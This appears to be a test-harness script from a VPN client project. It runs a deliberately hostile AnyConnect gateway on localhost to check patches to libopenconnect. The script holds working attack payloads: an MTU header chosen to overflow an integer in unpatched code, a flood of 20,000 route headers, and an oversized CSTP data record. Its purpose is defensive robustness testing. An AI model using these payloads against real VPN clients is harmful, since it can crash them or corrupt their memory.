"""A deliberately hostile AnyConnect gateway for testing Wombat's libopenconnect patches
(scripts/patch-openconnect.py). It answers the tunnel CONNECT with an attack, then floods data.

    python3 -I scripts/dev/hostile-gateway.py mtu|headers|deflate [port]
    OCPROBE_HOSTILE=4555 scripts/dev/oc-probe.sh      # the engine must refuse it, not crash

Uses the ocserv test peer's certificate (scripts/dev/ocserv-peer.sh up makes it).
"""
import pathlib
import socket
import ssl
import sys

mode = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 4555
certs = pathlib.Path(__file__).resolve().parents[2] / "build/ocserv-peer"
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certs / "server.pem", certs / "server.key")

with socket.create_server(("127.0.0.1", port)) as server:
    print(f"hostile-gateway: {mode} on 127.0.0.1:{port}", flush=True)
    conn, _ = server.accept()
    with context.wrap_socket(conn, server_side=True) as tls:
        request = b""
        while b"\r\n\r\n" not in request:
            chunk = tls.recv(4096)
            if not chunk:
                sys.exit("hostile-gateway: client closed")
            request += chunk
        lines = ["HTTP/1.1 200 CONNECTED", "X-CSTP-Address: 10.97.0.2", "X-CSTP-Netmask: 255.255.255.0",
                 "X-CSTP-Keepalive: 30", "X-CSTP-DPD: 30"]
        if mode == "mtu":
            lines.append("X-CSTP-MTU: 2147483610")  # in [2147483608, INT_MAX]: wraps alloc_pkt's int (unpatched)
        elif mode == "deflate":
            lines += ["X-CSTP-MTU: 1400", "X-CSTP-Content-Encoding: deflate"]
        else:
            lines.append("X-CSTP-MTU: 1400")
            lines += [f"X-CSTP-Split-Include: 10.{i // 65536 % 256}.{i // 256 % 256}.{i % 256}/255.255.255.255" for i in range(20000)]
        tls.sendall(("\r\n".join(lines) + "\r\n\r\n").encode())
        try:
            # A CSTP data record header claiming a huge packet, then data.
            tls.sendall(b"STF\x01\x7f\xff\x00\x00" + b"A" * (1 << 20))
        except OSError:
            pass
        print("hostile-gateway: attack sent", flush=True)
